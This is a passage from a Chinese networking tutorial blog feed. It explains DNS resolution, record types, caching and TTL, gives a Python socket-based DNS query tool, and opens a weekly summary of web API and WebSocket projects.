class="hljs-number">3</span>. 返回：<span class="hljs-string">&quot;我不知道，但你可以问.com服务器(192.x.x.x)&quot;</span><br>     ↓<br>┌────────────────┐<br>│ 本地DNS服务器  │<br>└────┬───────────┘<br>     │ <span class="hljs-number">4</span>. 查询.com服务器(<span class="hljs-number">192</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span>.<span class="hljs-attribute">x</span>)<br>     ↓<br>┌────────────────┐<br>│ <span class="hljs-selector-class">.com</span> DNS服务器 │<br>└────┬───────────┘<br>     │ <span class="hljs-number">5</span>. 返回：<span class="hljs-string">&quot;我不知道，但你可以问example.com服务器(93.x.x.x)&quot;</span><br>     ↓<br>┌────────────────┐<br>│ 本地DNS服务器  │<br>└────┬───────────┘<br>     │ <span class="hljs-number">6</span>. 查询example.com服务器(<span class="hljs-number">93</span><span class="hljs-selector-class">.x</span><span class="hljs-selector-class">.x</span>.<span class="hljs-attribute">x</span>)<br>     ↓<br>┌─────────────────────┐<br>│ example.com服务器   │<br>└────┬────────────────┘<br>     │ <span class="hljs-number">7</span>. 返回：<span class="hljs-string">&quot;www.example.com的IP是93.184.216.34&quot;</span><br>     ↓<br>┌────────────────┐<br>│ 本地DNS服务器  │<br>└────┬───────────┘<br>     │ <span class="hljs-number">8</span>. 返回最终答案<br>     ↓<br>┌──────────┐<br>│  客户端  │<br>└──────────┘<br><br>特点：<br>✅ 每个服务器只负责回答或指引<br>✅ 服务器负担轻<br>❌ 需要多次查询<br>❌ 客户端需要多次请求<br><br>生活化类比：<br>迭代查询 = 问路<br>你：<span class="hljs-string">&quot;请问图书馆怎么走？&quot;</span><br>路人甲：<span class="hljs-string">&quot;我不知道，但你可以问前面的警察&quot;</span><br>你走到警察处：<span class="hljs-string">&quot;请问图书馆怎么走？&quot;</span><br>警察：<span class="hljs-string">&quot;直走500米左转&quot;</span><br></code></pre></td></tr></table></figure><h3 id="3-3-查询对比"><a href="#3-3-查询对比" class="headerlink" title="3.3 查询对比"></a>3.3 查询对比</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs stylus">实际DNS查询过程：<br><br>客户端 → 本地DNS: 递归查询<br>本地DNS → 其他DNS: 迭代查询<br><br>为什么这样设计？<br><span class="hljs-number">1</span>. 简化客户端<br><span class="hljs-number">2</span>. 减轻根服务器负担<br><span class="hljs-number">3</span>. 利用本地DNS缓存<br><br>完整查询示例：<br><br>时间线：<br>T0: 客户端请求 www<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br>    ├─ 客户端 → 本地DNS <span class="hljs-selector-attr">[递归查询]</span><br><br>T1: 本地DNS开始工作<br>    ├─ 检查缓存（未命中）<br>    ├─ 本地DNS → 根服务器 <span class="hljs-selector-attr">[迭代查询]</span><br>    └─ 根返回：请查询.com服务器(<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.gtld-servers</span>.net)<br><br>T2: 本地DNS继续<br>    ├─ 本地DNS → .com服务器 <span class="hljs-selector-attr">[迭代查询]</span><br>    └─ .com返回：请查询ns1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span><br><br>T3: 本地DNS最后查询<br>    ├─ 本地DNS → ns1<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span> <span class="hljs-selector-attr">[迭代查询]</span><br>    └─ ns1返回：<span class="hljs-number">93.184</span>.<span class="hljs-number">216.34</span><br><br>T4: 结果返回<br>    ├─ 本地DNS缓存结果（TTL=<span class="hljs-number">300</span>秒）<br>    └─ 本地DNS → 客户端 <span class="hljs-selector-attr">[返回答案]</span><br><br>总耗时：约<span class="hljs-number">50</span>-<span class="hljs-number">100ms</span>（首次查询）<br></code></pre></td></tr></table></figure><hr><h2 id="4-DNS记录类型"><a href="#4-DNS记录类型" class="headerlink" title="4. DNS记录类型"></a>4. DNS记录类型</h2><h3 id="4-1-常见DNS记录"><a href="#4-1-常见DNS记录" class="headerlink" title="4.1 常见DNS记录"></a>4.1 常见DNS记录</h3><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext">DNS资源记录（Resource Records, RR）格式：<br>名称  TTL  类  类型  数据<br><br>主要记录类型：<br><br>1. A记录 (Address)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">域名 → IPv4地址</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">示例：www.example.com. 300 IN A 93.184.216.34</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">用途：最常用，将域名指向IPv4</span><br><br>2. AAAA记录<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">域名 → IPv6地址</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">示例：www.example.com. 300 IN AAAA 2606:2800:220:1:248:1893:25c8:1946</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">用途：将域名指向IPv6</span><br><br>3. CNAME记录 (Canonical Name)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">域名 → 另一个域名（别名）</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">示例：www.example.com. 300 IN CNAME example.com.</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">用途：创建域名别名</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">注意：CNAME不能与其他记录共存</span><br><br>4. MX记录 (Mail Exchange)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">域名 → 邮件服务器</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">示例：example.com. 300 IN MX 10 mail.example.com.</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">优先级：数字越小优先级越高</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">用途：指定邮件服务器</span><br><br>5. NS记录 (Name Server)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">域名 → 权威DNS服务器</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">示例：example.com. 300 IN NS ns1.example.com.</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">用途：指定域名的DNS服务器</span><br><br>6. TXT记录<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">域名 → 文本信息</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">示例：example.com. 300 IN TXT &quot;v=spf1 include:_spf.example.com ~all&quot;</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">用途：SPF、DKIM、域名验证等</span><br><br>7. PTR记录 (Pointer)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">IP地址 → 域名（反向解析）</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">示例：34.216.184.93.in-addr.arpa. 300 IN PTR www.example.com.</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">用途：IP反向查询</span><br><br>8. SOA记录 (Start of Authority)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">域的权威信息</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">包含：主DNS服务器、管理员邮箱、序列号、刷新时间等</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">示例：</span><br>     example.com. 3600 IN SOA ns1.example.com. admin.example.com. (<br>       2024010601 ; 序列号<br>       3600       ; 刷新时间<br>       1800       ; 重试时间<br>       604800     ; 过期时间<br>       86400      ; 最小TTL<br>     )<br><br>9. SRV记录 (Service)<br>   <span class="hljs-bullet">-</span> <span class="hljs-string">服务位置记录</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">示例：_http._tcp.example.com. 300 IN SRV 10 5 80 www.example.com.</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">用途：指定服务的位置</span><br></code></pre></td></tr></table></figure><h3 id="4-2-DNS记录示例"><a href="#4-2-DNS记录示例" class="headerlink" title="4.2 DNS记录示例"></a>4.2 DNS记录示例</h3><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs tap">完整的DNS区域文件示例：<br><br>; example.com DNS区域文件<br><br>; SOA记录<br>example.com.   <span class="hljs-number"> 3600 </span>   IN  SOA ns1.example.com. admin.example.com. (<br>                           <span class="hljs-number"> 2024010601 </span> ; Serial<br>                           <span class="hljs-number"> 3600 </span>       ; Refresh<br>                           <span class="hljs-number"> 1800 </span>       ; Retry<br>                           <span class="hljs-number"> 604800 </span>     ; Expire<br>                           <span class="hljs-number"> 86400 </span>)     ; Minimum TTL<br><br>; NS记录<br>example.com.   <span class="hljs-number"> 3600 </span>   IN  NS  ns1.example.com.<br>example.com.   <span class="hljs-number"> 3600 </span>   IN  NS  ns2.example.com.<br><br>; A记录<br>example.com.   <span class="hljs-number"> 300 </span>    IN  A   93.184.216.34<br>www.example.com.<span class="hljs-number"> 300 </span>   IN  A   93.184.216.34<br>mail.example.com.<span class="hljs-number"> 300 </span>  IN  A   93.184.216.35<br>ftp.example.com. <span class="hljs-number"> 300 </span>  IN  A   93.184.216.36<br><br>; AAAA记录<br>www.example.com.<span class="hljs-number"> 300 </span>   IN  AAAA 2606:2800:220:1:248:1893:25c8:1946<br><br>; MX记录<br>example.com.   <span class="hljs-number"> 300 </span>    IN  MX <span class="hljs-number"> 10 </span>mail.example.com.<br>example.com.   <span class="hljs-number"> 300 </span>    IN  MX <span class="hljs-number"> 20 </span>mail2.example.com.<br><br>; CNAME记录<br>blog.example.com.<span class="hljs-number"> 300 </span>  IN  CNAME www.example.com.<br>shop.example.com.<span class="hljs-number"> 300 </span>  IN  CNAME www.example.com.<br><br>; TXT记录<br>example.com.   <span class="hljs-number"> 300 </span>    IN  TXT &quot;v=spf1 mx ~all&quot;<br>_dmarc.example.com.<span class="hljs-number"> 300 </span>IN  TXT &quot;v=DMARC1; p=none; rua=mailto:dmarc@example.com&quot;<br><br>记录解读：<br>- TTL 300: 缓存5分钟<br>- TTL 3600: 缓存1小时<br>- IN: Internet类<br>- 优先级10 &lt; 20: mail.example.com优先<br></code></pre></td></tr></table></figure><hr><h2 id="5-DNS缓存机制"><a href="#5-DNS缓存机制" class="headerlink" title="5. DNS缓存机制"></a>5. DNS缓存机制</h2><h3 id="5-1-缓存层级"><a href="#5-1-缓存层级" class="headerlink" title="5.1 缓存层级"></a>5.1 缓存层级</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs markdown">DNS缓存的多个层级：<br><br><span class="hljs-bullet">1.</span> 浏览器缓存<br><span class="hljs-bullet">   -</span> 最快，但容量小<br><span class="hljs-bullet">   -</span> Chrome: chrome://net-internals/#dns<br><span class="hljs-bullet">   -</span> TTL: 通常60秒<br><br><span class="hljs-bullet">2.</span> 操作系统缓存<br><span class="hljs-bullet">   -</span> Windows: ipconfig /displaydns<br><span class="hljs-bullet">   -</span> Linux: systemd-resolved<br><span class="hljs-bullet">   -</span> macOS: dscacheutil -cachedump<br><br><span class="hljs-bullet">3.</span> 本地DNS服务器缓存<br><span class="hljs-bullet">   -</span> ISP的DNS服务器<br><span class="hljs-bullet">   -</span> 或自己配置的DNS（如8.8.8.8）<br><span class="hljs-bullet">   -</span> TTL: 由记录的TTL决定<br><br><span class="hljs-bullet">4.</span> 其他DNS服务器缓存<br><span class="hljs-bullet">   -</span> 中间DNS服务器<br><span class="hljs-bullet">   -</span> 根据TTL缓存<br><br>缓存工作流程：<br>查询 www.example.com<br><br>Level 1: 浏览器缓存<br>  ├─ 命中 → 直接返回 ✅<br>  └─ 未命中 → 继续<br><br>Level 2: OS缓存<br>  ├─ 命中 → 返回 ✅<br>  └─ 未命中 → 继续<br><br>Level 3: 本地DNS缓存<br>  ├─ 命中 → 返回 ✅<br>  └─ 未命中 → 开始递归/迭代查询<br><br>Level 4: 实际DNS查询<br>  └─ 查询权威服务器 → 获取答案 → 各层缓存<br></code></pre></td></tr></table></figure><h3 id="5-2-TTL（生存时间）"><a href="#5-2-TTL（生存时间）" class="headerlink" title="5.2 TTL（生存时间）"></a>5.2 TTL（生存时间）</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TTL (Time To Live) - 缓存有效期<br><br>示例：<br>www.example.com. 300 IN A 93.184.216.34<br><span class="hljs-code">                 ↑</span><br><span class="hljs-code">                TTL=300秒（5分钟）</span><br><span class="hljs-code"></span><br>TTL的作用：<br><span class="hljs-bullet">1.</span> 控制缓存时间<br><span class="hljs-bullet">2.</span> 平衡性能和新鲜度<br><span class="hljs-bullet">3.</span> 减轻DNS服务器负担<br><br>TTL设置策略：<br><br>短TTL（60-300秒）：<br>✅ 变更生效快<br>✅ 适合频繁变更的记录<br>❌ 查询多，服务器压力大<br><br>长TTL（3600-86400秒）：<br>✅ 减少查询，降低延迟<br>✅ 减轻服务器负担<br>❌ 变更生效慢<br><br>推荐设置：<br><span class="hljs-bullet">-</span> 常用记录（www）: 300-3600秒<br><span class="hljs-bullet">-</span> 稳定记录（NS）: 3600-86400秒<br><span class="hljs-bullet">-</span> 邮件记录（MX）: 3600秒<br><span class="hljs-bullet">-</span> 变更前临时降低TTL<br></code></pre></td></tr></table></figure><hr><h2 id="6-实战项目：DNS查询工具"><a href="#6-实战项目：DNS查询工具" class="headerlink" title="6. 实战项目：DNS查询工具"></a>6. 实战项目：DNS查询工具</h2><h3 id="6-1-代码实现"><a href="#6-1-代码实现" class="headerlink" title="6.1 代码实现"></a>6.1 代码实现</h3><pre><code class="language-python"># day35_dns_query_tool.py# 功能：DNS查询工具import socketimport structfrom typing import List, Tuple, Dictimport timeclass DNSQuery:    &quot;&quot;&quot;    DNS查询工具    功能：        1. 构造DNS查询报文        2. 发送查询        3. 解析响应        4. 支持多种记录类型    &quot;&quot;&quot;    # DNS记录类型    QTYPE = {        &#39;A&#39;: 1,      # IPv4地址        &#39;NS&#39;: 2,     # 域名服务器        &#39;CNAME&#39;: 5,  # 规范名称        &#39;SOA&#39;: 6,    # 授权开始        &#39;PTR&#39;: 12,   # 指针记录        &#39;MX&#39;: 15,    # 邮件交换        &#39;TXT&#39;: 16,   # 文本        &#39;AAAA&#39;: 28,  # IPv6地址        &#39;ANY&#39;: 255   # 所有记录    }    def __init__(self, dns_server=&#39;8.8.8.8&#39;, port=53):        &quot;&quot;&quot;        初始化DNS查询器        参数：            dns_server: DNS服务器地址            port: DNS端口（默认53）        &quot;&quot;&quot;        self.dns_server = dns_server        self.port = port    def build_query(self, domain: str, qtype: str = &#39;A&#39;) -&gt; bytes:        &quot;&quot;&quot;        构造DNS查询报文        参数：            domain: 要查询的域名            qtype: 查询类型（A, AAAA, MX等）        返回：            DNS查询报文（字节）        DNS报文格式：        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        |                    Header                     |        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        |                   Question                    |        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        |                    Answer                     |        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        |                  Authority                    |        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        |                  Additional                   |        +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+        &quot;&quot;&quot;        # 1. 构造Header（12字节）        transaction_id = 0x1234  # 事务ID        flags = 0x0100  # 标准查询，期望递归        questions = 1   # 问题数        answers = 0     # 回答数        authority = 0   # 权威记录数        additional = 0  # 附加记录数        header = struct.pack(            &#39;!HHHHHH&#39;,            transaction_id, flags,            questions, answers, authority, additional        )        # 2. 构造Question        # 域名编码：将 www.example.com 编码为 \x03www\x07example\x03com\x00        qname = b&#39;&#39;        for part in domain.split(&#39;.&#39;):            qname += bytes([len(part)]) + part.encode()        qname += b&#39;\x00&#39;  # 结束标记        qtype_value = self.QTYPE.get(qtype.upper(), 1)        qclass = 1  # IN (Internet)        question = qname + struct.pack(&#39;!HH&#39;, qtype_value, qclass)        return header + question    def parse_response(self, response: bytes) -&gt; Dict:        &quot;&quot;&quot;        解析DNS响应        参数：            response: DNS响应报文        返回：            解析后的结果字典        &quot;&quot;&quot;        result = {            &#39;header&#39;: {},            &#39;questions&#39;: [],            &#39;answers&#39;: [],            &#39;authority&#39;: [],            &#39;additional&#39;: []        }        # 解析Header        header = struct.unpack(&#39;!HHHHHH&#39;, response[:12])        result[&#39;header&#39;] = {            &#39;id&#39;: header[0],            &#39;flags&#39;: header[1],            &#39;questions&#39;: header[2],            &#39;answers&#39;: header[3],            &#39;authority&#39;: header[4],            &#39;additional&#39;: header[5]        }        # 解析Answer部分（简化版本）        offset = 12        # 跳过Question部分        while response[offset] != 0:            offset += 1        offset += 5  # 跳过结束符和QTYPE、QCLASS        # 解析Answer        for _ in range(result[&#39;header&#39;][&#39;answers&#39;]):            # 简化：直接提取IP地址（假设是A记录）            if offset + 12 &lt;= len(response):                # 跳过名称（指针）                offset += 2                # 读取类型、类、TTL、数据长度                rtype, rclass, ttl, rdlength = struct.unpack(                    &#39;!HHIH&#39;,                    response[offset:offset+10]                )                offset += 10                # 读取数据                rdata = response[offset:offset+rdlength]                offset += rdlength                if rtype == 1 and rdlength == 4:  # A记录                    ip = &#39;.&#39;.join(str(b) for b in rdata)                    result[&#39;answers&#39;].append({                        &#39;type&#39;: &#39;A&#39;,                        &#39;ttl&#39;: ttl,                        &#39;data&#39;: ip                    })        return result    def query(self, domain: str, qtype: str = &#39;A&#39;, verbose: bool = True) -&gt; Dict:        &quot;&quot;&quot;        执行DNS查询        参数：            domain: 域名            qtype: 查询类型            verbose: 是否显示详细信息        返回：            查询结果        &quot;&quot;&quot;        if verbose:            print(f&quot;\n正在查询: {domain} ({qtype}记录)&quot;)            print(f&quot;DNS服务器: {self.dns_server}:{self.port}&quot;)        # 构造查询        query_data = self.build_query(domain, qtype)        # 创建UDP socket        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)        sock.settimeout(3)        try:            # 发送查询            start_time = time.time()            sock.sendto(query_data, (self.dns_server, self.port))            # 接收响应            response, _ = sock.recvfrom(512)            query_time = (time.time() - start_time) * 1000            # 解析响应            result = self.parse_response(response)            result[&#39;query_time&#39;] = query_time            if verbose:                print(f&quot;查询时间: {query_time:.2f}ms&quot;)                print(f&quot;回答数量: {result[&#39;header&#39;][&#39;answers&#39;]}&quot;)                if result[&#39;answers&#39;]:                    print(&quot;\n结果:&quot;)                    for answer in result[&#39;answers&#39;]:                        print(f&quot;  类型: {answer[&#39;type&#39;]}&quot;)                        print(f&quot;  TTL: {answer[&#39;ttl&#39;]}秒&quot;)                        print(f&quot;  数据: {answer[&#39;data&#39;]}&quot;)            return result        except socket.timeout:            if verbose:                print(&quot;❌ 查询超时&quot;)            return {&#39;error&#39;: &#39;timeout&#39;}        except Exception as e:            if verbose:                print(f&quot;❌ 查询失败: {e}&quot;)            return {&#39;error&#39;: str(e)}        finally:            sock.close()    def query_with_system(self, domain: str, verbose: bool = True):        &quot;&quot;&quot;        使用系统DNS查询（对比）        参数：            domain: 域名            verbose: 是否显示详细信息        &quot;&quot;&quot;        if verbose:            print(f&quot;\n使用系统DNS查询: {domain}&quot;)        try:            start_time = time.time()            result = socket.getaddrinfo(domain, None)            query_time = (time.time() - start_time) * 1000            if verbose:                print(f&quot;查询时间: {query_time:.2f}ms&quot;)                print(&quot;\n结果:&quot;)                for item in result:                    if item[0] == socket.AF_INET:  # IPv4                        print(f&quot;  IPv4: {item[4][0]}&quot;)                    elif item[0] == socket.AF_INET6:  # IPv6                        print(f&quot;  IPv6: {item[4][0]}&quot;)            return {&#39;results&#39;: result, &#39;query_time&#39;: query_time}        except Exception as e:            if verbose:                print(f&quot;❌ 查询失败: {e}&quot;)            return {&#39;error&#39;: str(e)}def compare_dns_servers():    &quot;&quot;&quot;对比不同DNS服务器的性能&quot;&quot;&quot;    print(&quot;\n&quot; + &quot;=&quot;*60)    print(&quot; DNS服务器性能对比&quot;)    print(&quot;=&quot;*60)    dns_servers = [        (&#39;Google DNS&#39;, &#39;8.8.8.8&#39;),        (&#39;Cloudflare DNS&#39;, &#39;1.1.1.1&#39;),        (&#39;114 DNS&#39;, &#39;114.114.114.114&#39;),    ]    test_domains = [        &#39;www.baidu.com&#39;,        &#39;www.google.com&#39;,        &#39;www.github.com&#39;    ]    print(f&quot;\n测试域名: {&#39;, &#39;.join(test_domains)}\n&quot;)    for name, server in dns_servers:        print(f&quot;\n{name} ({server}):&quot;)        print(&quot;-&quot; * 60)        query_tool = DNSQuery(server)        total_time = 0        success_count = 0        for domain in test_domains:            result = query_tool.query(domain, verbose=False)            if &#39;query_time&#39; in result:                total_time += result[&#39;query_time&#39;]                success_count += 1                print(f&quot;  {domain}: {result[&#39;query_time&#39;]:.2f}ms&quot;)        if success_count &gt; 0:            avg_time = total_time / success_count            print(f&quot;\n  平均查询时间: {avg_time:.2f}ms&quot;)def main():    &quot;&quot;&quot;主程序&quot;&quot;&quot;    print(&quot;&quot;&quot;    ╔══════════════════════════════════════════════════════════╗    ║       DNS查询工具 v1.0                                    ║    ║       DNS Query Tool                                     ║    ╚══════════════════════════════════════════════════════════╝    &quot;&quot;&quot;)    # 创建DNS查询器    dns_query = DNSQuery(dns_server=&#39;8.8.8.8&#39;)    # 演示1：基本查询    print(&quot;\n【演示1：基本DNS查询】&quot;)    dns_query.query(&#39;www.baidu.com&#39;, &#39;A&#39;)    input(&quot;\n按Enter继续...&quot;)    # 演示2：系统查询对比    print(&quot;\n【演示2：自定义vs系统DNS查询对比】&quot;)    dns_query.query_with_system(&#39;www.baidu.com&#39;)    input(&quot;\n按Enter继续...&quot;)    # 演示3：DNS服务器性能对比    print(&quot;\n【演示3：不同DNS服务器性能对比】&quot;)    compare_dns_servers()    print(&quot;&quot;&quot;\n总结：DNS查询过程包括：1. 构造查询报文2. 发送UDP查询（端口53）3. 接收响应4. 解析结果优化建议：- 使用快速DNS服务器- 合理设置TTL- 启用DNS缓存- 考虑使用DNS over HTTPS (DoH)明天我们将学习DNS安全（DNSSEC）！    &quot;&quot;&quot;)if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>五周实战总结</title>
    <link href="/2025/11/10/%E4%BA%94%E5%91%A8%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    <url>/2025/11/10/%E4%BA%94%E5%91%A8%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="Day-32-34-第五周实战总结"><a href="#Day-32-34-第五周实战总结" class="headerlink" title="Day 32-34: 第五周实战总结"></a>Day 32-34: 第五周实战总结</h1><h2 id="Day-32-实战-构建Web-API服务"><a href="#Day-32-实战-构建Web-API服务" class="headerlink" title="Day 32: 实战 - 构建Web API服务"></a>Day 32: 实战 - 构建Web API服务</h2><p><strong>学习内容</strong>：<br>整合前面学习的RESTful API知识，构建一个完整的Web API服务。</p><p><strong>项目特性</strong>：</p><ul><li>JWT认证系统</li><li>请求限流（Rate Limiting）</li><li>日志记录</li><li>错误处理</li><li>API文档（Swagger）</li><li>单元测试</li></ul><p><strong>项目结构</strong>：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">api_server/<br>├── app/<br>│   ├── __init__<span class="hljs-selector-class">.py</span><br>│   ├── models<span class="hljs-selector-class">.py</span><br>│   ├── routes/<br>│   ├── auth<span class="hljs-selector-class">.py</span><br>│   ├── middleware<span class="hljs-selector-class">.py</span><br>│   └── utils<span class="hljs-selector-class">.py</span><br>├── tests/<br>├── requirements<span class="hljs-selector-class">.txt</span><br>└── run.py<br></code></pre></td></tr></table></figure><p><strong>核心功能代码</strong>已放置在 <code>code/day32/</code> 目录</p><hr><h2 id="Day-33-实战-WebSocket聊天室"><a href="#Day-33-实战-WebSocket聊天室" class="headerlink" title="Day 33: 实战 - WebSocket聊天室"></a>Day 33: 实战 - WebSocket聊天室</h2><p><strong>学习内容</strong>：<br>实现一个功能完整的WebSocket实时聊天室。</p><p><strong>功能清单</strong>：</p><ul><li>✅ 用户登录&#x2F;注册</li><li>✅ 实时消息发送</li><li>✅ 消息历史记录</li><li>✅ 在线用户列表</li><li>✅ 私聊功能</li><li>✅ 房间管理</li><li>✅ 断线重连</li><li>✅ Web前端界面</li></ul><p><strong>核心功能代码</strong>已放置在 <code>code/day33/</code> 目录</p><hr><h2 id="Day-34-第五周总结"><a href="#Day-34-第五周总结" class="headerlink" title="Day 34: 第五周总结"></a>Day 34: 第五周总结</h2><h3 id="本周学习回顾"><a href="#本周学习回顾" class="headerlink" title="本周学习回顾"></a>本周学习回顾</h3><p><strong>核心知识点</strong>：</p><ol><li>HTTP&#x2F;2 - 性能优化协议</li><li>HTTP&#x2F;3 &amp; QUIC - 下一代互联网协议</li><li>RESTful API - Web API设计规范</li><li>WebSocket - 实时双向通信</li></ol><h3 id="技术栈掌握"><a href="#技术栈掌握" class="headerlink" title="技术栈掌握"></a>技术栈掌握</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 